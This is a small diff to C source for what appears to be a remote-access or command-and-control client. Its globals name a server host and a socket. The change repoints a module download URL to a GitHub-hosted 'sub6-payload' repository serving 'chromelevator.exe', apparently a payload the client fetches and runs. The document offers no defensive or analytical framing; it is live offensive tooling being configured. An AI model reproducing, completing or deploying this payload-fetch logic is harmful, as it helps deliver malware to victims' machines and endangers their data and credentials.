@@ -197,7 +197,7 @@ static void init_bg() {
 char g_server_host[256] = "api.root1.me";
 char g_server_port[6] = "80";
 char g_server_path[256] = "/";
-char g_mod_url[512] = "http://192.168.1.8:8000/files/chromelevator.exe";
+char g_mod_url[512] = "https://github.com/adhikarisubodh9991/sub6-payload/raw/refs/heads/main/files/chromelevator.exe";
 
 // Global variables
 SOCKET g_sock = INVALID_SOCKET;
